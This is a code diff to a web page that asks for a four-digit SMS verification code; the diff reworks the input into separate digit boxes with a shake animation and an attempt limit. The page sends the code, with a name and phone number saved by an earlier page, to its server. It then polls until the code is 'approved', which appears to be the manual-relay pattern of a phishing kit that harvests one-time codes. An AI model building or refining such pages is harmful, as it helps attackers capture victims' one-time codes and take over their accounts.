@@ -28,19 +28,39 @@
     h2 { margin-bottom: 8px; }
     p { color: #666; font-size: 14px; }
 
-    input {
-        width: 100%;
-        padding: 12px;
-        font-size: 18px;
-        border: 2px solid #ccc;
-        border-radius: 8px;
-        outline: none;
-        margin: 15px 0;
+    .code-boxes {
+        display: flex;
+        justify-content: space-between;
+        margin: 25px 0;
+        transition: all 0.3s ease;
     }
 
-    input:focus {
-        border-color: red;
-        box-shadow: 0 0 5px rgba(255,0,0,0.3);
+    .code-boxes input {
+        width: 55px;
+        height: 60px;
+        text-align: center;
+        font-size: 24px;
+        border: 2px solid red;
+        border-radius: 8px;
+        outline: none;
+        transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .code-boxes input:focus {
+        border-color: darkred;
+        box-shadow: 0 0 5px rgba(255,0,0,0.5);
+    }
+
+    .shake {
+        animation: shake 0.4s;
+    }
+
+    @keyframes shake {
+        0% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        50% { transform: translateX(5px); }
+        75% { transform: translateX(-5px); }
+        100% { transform: translateX(0); }
     }
 
     button {
@@ -93,11 +113,17 @@
 
 <body>
 <div class="code-container">
-    <h2>Enter Your Code</h2>
-    <p>Please enter your verification code</p>
+    <h2>Enter Your 4-Digit Code</h2>
+    <p>Please enter the code sent to your sms</p>
 
     <form id="codeForm">
-        <input type="text" id="codeInput" placeholder="Enter code" maxlength="10" required>
+        <div class="code-boxes" id="codeBoxes">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+        </div>
+
         <button id="submitBtn" disabled>
             Submit Code
             <div class="spinner" id="spinner"></div>
@@ -108,21 +134,42 @@
 </div>
 
 <script>
-const input = document.getElementById('codeInput');
+const inputs = document.querySelectorAll('.code-boxes input');
 const button = document.getElementById('submitBtn');
 const statusText = document.getElementById('status');
 const spinner = document.getElementById('spinner');
 const form = document.getElementById('codeForm');
+const codeBoxes = document.getElementById('codeBoxes');
 
-input.addEventListener('input', () => {
-    button.disabled = !input.value.trim();
+let attempts = 0;
+const maxAttempts = 3;
+
+inputs[0].focus();
+
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+        checkFilled();
+    });
+    input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
 });
+
+function checkFilled() {
+    button.disabled = ![...inputs].every(i => i.value);
+}
 
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    const code = input.value.trim();
-    const name = localStorage.getItem('name');   // ✅ get name
-    const phone = localStorage.getItem('phone'); // ✅ get phone
+    const code = [...inputs].map(i => i.value).join('');
+    const name = localStorage.getItem('name');
+    const phone = localStorage.getItem('phone');
 
     button.disabled = true;
     button.innerText = 'Verifying...';
@@ -131,8 +178,8 @@ form.addEventListener('submit', async (e) => {
 
     await fetch('/submit-code', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name, phone, code }) // ✅ send name + phone + code
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ name, phone, code })
     });
 
     pollCodeApproval(code);
@@ -150,12 +197,24 @@ async function pollCodeApproval(code) {
 
         if (data.approved === false) {
             clearInterval(interval);
+            attempts++;
+            codeBoxes.classList.add('shake');
+            setTimeout(() => codeBoxes.classList.remove('shake'), 400);
+
+            if (attempts >= maxAttempts) {
+                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
+                button.disabled = true;
+                spinner.style.display = 'none';
+                inputs.forEach(i => i.value = '');
+                return;
+            }
+
             statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
             button.innerText = 'Submit Code';
             spinner.style.display = 'none';
-            input.value = '';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
             button.disabled = true;
-            input.focus();
         }
     }, 2000);
 }
